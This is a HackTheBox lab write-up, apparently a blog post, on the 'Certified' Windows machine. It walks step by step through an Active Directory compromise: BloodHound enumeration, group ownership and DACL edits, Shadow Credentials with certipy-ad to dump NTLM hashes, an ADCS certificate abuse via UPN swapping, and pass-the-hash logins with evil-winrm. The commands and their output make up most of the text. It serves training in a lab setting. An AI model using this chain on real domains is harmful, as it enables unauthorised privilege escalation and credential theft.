@@ -1,0 +1,314 @@
+---
+title: "HTB: Certified"
+date: 2024-12-20
+description: "Certified is a Windows Machine that consist of exploiting Certificate Authority to elevate our privileges."
+keywords: ["HTB", "HackTheBox", "Certified", "Certified.HTB"]
+draft: false
+---
+
+## Initial Foothold
+
+Let's start off searching for open ports using Nmap.
+
+```bash
+kali@kali:~/HTB/Machines/Certified$ nmap -sV -sC -p- --min-rate=100000 -o nmap.result 10.129.110.87    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 16:19 EST
+Nmap scan report for 10.129.110.87
+Host is up (0.22s latency).
+Not shown: 65515 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-17 04:19:35Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.certified.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
+| Not valid before: 2024-05-13T15:49:36
+|_Not valid after:  2025-05-13T15:49:36
+|_ssl-date: 2024-12-17T04:21:06+00:00; +7h00m00s from scanner time.
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.certified.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
+| Not valid before: 2024-05-13T15:49:36
+|_Not valid after:  2025-05-13T15:49:36
+|_ssl-date: 2024-12-17T04:21:06+00:00; +7h00m00s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-12-17T04:21:05+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: commonName=DC01.certified.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
+| Not valid before: 2024-05-13T15:49:36
+|_Not valid after:  2025-05-13T15:49:36
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.certified.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
+| Not valid before: 2024-05-13T15:49:36
+|_Not valid after:  2025-05-13T15:49:36
+|_ssl-date: 2024-12-17T04:21:06+00:00; +7h00m00s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49690/tcp open  msrpc         Microsoft Windows RPC
+49695/tcp open  msrpc         Microsoft Windows RPC
+49724/tcp open  msrpc         Microsoft Windows RPC
+49745/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+| smb2-time: 
+|   date: 2024-12-17T04:20:25
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 99.81 seconds
+```
+
+So, there are many ports open. However, the only interesting information obtained from the nmap scan is `dc01.certified.htb` and let's add that into our `/etc/hosts` file.
+
+```bash
+kali@kali:~/HTB/Machines/Certified$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+10.129.110.87   certified.htb dc01.certified.htb
+```
+
+The machine comes with the default credentials `judith.mader:judith09` and we can use that credential to collect data from the active directory environment using bloodhound-python.
+
+```bash
+kali@kali:~/HTB/Machines/Certified/Bloodhound$ bloodhound-python -d certified.htb -u judith.mader -p judith09 -ns 10.129.110.87 -c all
+INFO: Found AD domain: certified.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc01.certified.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.certified.htb
+INFO: Found 10 users
+INFO: Found 53 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.certified.htb
+INFO: Done in 00M 10S
+```
+
+We can now import all these JSON files to bloodhound and analyse the environment. 
+
+<img src="/assets/images/HTB-Certified/HTB-Certified-1.png" className="rounded-lg" />
+
+According to bloodhound the user Judith Mader has write owner over the group management and the management group has GenericWrite permission over management service.
+
+<img src="/assets/images/HTB-Certified/HTB-Certified-2.png" className="rounded-lg" />
+
+What we can do is to add Judith Mader as the owner of the group and then add Judith Mader as a member of the group. Then we can take advantage of Shadow Credentials (`msDS-KeyCredentialLink`) to obtain the NTLM hash of the management service account.
+
+```bash
+kali@kali:~/HTB/Machines/Certified$ impacket-owneredit -action write -new-owner 'judith.mader' -target 'management' 'certified.htb/judith.mader:judith09'
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
+[*] - sAMAccountName: Domain Admins
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
+[*] OwnerSid modified successfully!
+
+kali@kali:~/HTB/Machines/Certified$ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target 'management' 'certified.htb/judith.mader:judith09'
+
+[*] DACL backed up to dacledit-20241218-082603.bak
+[*] DACL modified successfully!
+
+kali@kali:~/HTB/Machines/Certified$ net rpc group addmem 'management' 'judith.mader' -U 'certified.htb/judith.mader' -S 10.129.108.126
+Password for [CERTIFIED.HTB\judith.mader]:
+```
+
+We successfully added Judith Mader as the owner of the management group and added him into the group. All that needs to be completed now is to create the shadow credentials using `certipy-ad`.
+
+```bash
+kali@kali:~/HTB/Machines/Certified$ certipy-ad shadow add -u 'judith.mader@certified.htb' -p 'judith09' -target 'certified.htb' -account 'management_svc'
+
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'management_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '73c60f8b-55e3-13cc-65a5-5bbe72598f2a'
+[*] Adding Key Credential with device ID '73c60f8b-55e3-13cc-65a5-5bbe72598f2a' to the Key Credentials for 'management_svc'
+[*] Successfully added Key Credential with device ID '73c60f8b-55e3-13cc-65a5-5bbe72598f2a' to the Key Credentials for 'management_svc'
+[*] Saved certificate and private key to 'management_svc.pfx'
+
+kali@kali:~/HTB/Machines/Certified$ certipy-ad auth -pfx management_svc.pfx -domain 'certified.htb' -username 'management_svc'                           
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[!] Could not find identification in the provided certificate
+[*] Using principal: management_svc@certified.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'management_svc.ccache'
+[*] Trying to retrieve NT hash for 'management_svc'
+[*] Got hash for 'management_svc@certified.htb': aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584
+```
+
+I successfully managed to obtain the NTLM Hash for `management_svc` account which we can use to login to the server as `management_svc` and read the user flag.
+
+```bash
+kali@kali:~/HTB/Machines/Certified/PKINITtools$ evil-winrm -i 'certified.htb' -u 'management_svc' -H a091c1832bcdd4677c28b5a6a1295584 
+
+*Evil-WinRM* PS C:\Users\management_svc\Documents> whoami
+certified\management_svc
+*Evil-WinRM* PS C:\Users\management_svc\Documents> hostname
+DC01
+*Evil-WinRM* PS C:\Users\management_svc\Documents> pwd
+
+Path
+----
+C:\Users\management_svc\Documents
+
+*Evil-WinRM* PS C:\Users\management_svc\Documents> cat C:\Users\management_svc\Desktop\user.txt
+[USER FLAG]
+```
+
+## Road To Privilege Escalation
+
+According to bloodhound the management service account has `GenericAll` over the `ca_operator` account.
+
+<img src="/assets/images/HTB-Certified/HTB-Certified-3.png" className="rounded-lg" />
+
+We can obtain the NTLM hash of the `ca_operator` account by creating shadow credentials for it.
+
+```bash
+kali@kali:~/HTB/Machines/Certified$ certipy-ad shadow add -u 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -target 'certified.htb' -account 'ca_operator'   
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ca_operator'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'fb1b9930-d449-114c-a789-fc23aae635cf'
+[*] Adding Key Credential with device ID 'fb1b9930-d449-114c-a789-fc23aae635cf' to the Key Credentials for 'ca_operator'
+[*] Successfully added Key Credential with device ID 'fb1b9930-d449-114c-a789-fc23aae635cf' to the Key Credentials for 'ca_operator'
+[*] Saved certificate and private key to 'ca_operator.pfx'
+
+kali@kali:~/HTB/Machines/Certified$ certipy-ad auth -pfx ca_operator.pfx -domain 'certified.htb' -username 'ca_operator'                                                             
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[!] Could not find identification in the provided certificate
+[*] Using principal: ca_operator@certified.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'ca_operator.ccache'
+[*] Trying to retrieve NT hash for 'ca_operator'
+[*] Got hash for 'ca_operator@certified.htb': aad3b435b51404eeaad3b435b51404ee:b4b86f45c6018f1b664f70805f45d8f2
+```
+
+It seems as `ca_operator` is a certificate authority operator which means we can use `certipy-ad` to collect information about the certificate authority environment to potentially find vulnerabilities.
+
+```bash
+kali@kali:~/HTB/Machines/Certified/Bloodhound$ certipy-ad find -u 'ca_operator@certified.htb' -hashes b4b86f45c6018f1b664f70805f45d8f2 -target 'certified.htb' -old-bloodhound 
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'certified-DC01-CA'
+[*] Saved BloodHound data to '20241218155603_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @BloodHoundAD
+```
+
+According to bloodhound the `ca_operator` has access to a certificate called for Certified Authentication which we can use to obtain the NTLM hash of the administrator.
+
+<img src="/assets/images/HTB-Certified/HTB-Certified-4.png" className="rounded-lg" />
+
+To obtain the NTLM hash of the `administrator` we first need to change the user principal of the `ca_operator` to `Administrator` using `management_svc` account.
+
+```bash
+kali@kali:~/HTB/Machines/Certified$ certipy-ad account update -u 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user 'ca_operator' -upn 'Administrator'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_operator':
+    userPrincipalName                   : Administrator
+[*] Successfully updated 'ca_operator
+```
+
+Now the `ca_operator` can request a certificate and the certificate will be made for the `administrator` user instead of `ca_operator` service account.
+
+```bash
+kali@kali:~/HTB/Machines/Certified$ certipy-ad req -ca 'certified-DC01-CA' -template 'CertifiedAuthentication' -u 'ca_operator@certified.htb' -hashes 'b4b86f45c6018f1b664f70805f45d8f2'       
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 5
+[*] Got certificate with UPN 'Administrator'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+We managed to obtain the `administrator.pfx` and all that needs to be done now is to change the user principal of `ca_operator` back to the original user principal.
+
+```bash
+kali@kali:~/HTB/Machines/Certified$ certipy-ad account update -u 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user 'ca_operator' -upn 'ca_operator'              
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_operator':
+    userPrincipalName                   : ca_operator
+[*] Successfully updated 'ca_operator'
+```
+
+Now we can authenticate using the `administrator.pfx` file and we will successfully obtain the NTLM Hash of the administrator account.
+
+```bash
+kali@kali:~/HTB/Machines/Certified$ certipy-ad auth -pfx administrator.pfx -domain 'certified.htb' -username 'administrator' 
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@certified.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
+```
+
+We can now login as `administrator` using the NTLM hash with `evil-winrm` and read the root flag. 
+
+```bash
+kali@kali:~/HTB/Machines/Certified$ evil-winrm -i 'certified.htb' -u 'administrator' -H '0d5b49608bbce1751f708748f67e2d34'
+...
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+certified\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
+DC01
+*Evil-WinRM* PS C:\Users\Administrator\Documents> pwd
+
+Path
+----
+C:\Users\Administrator\Documents
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\Desktop\root.txt
+[ROOT FLAG]
+```
+
+## Conclusion
+
+I learnt a-lot from the Certified machine as it taught me about Active Directory Certificate Authority and the vulnerabilities with it especially when it's misconfigured. I also learnt a-lot about the `certipy-ad` tool and the features that comes with it. I would highly recommend this machine for cyber security people who are interested in learning more about Active Directory Certificates.
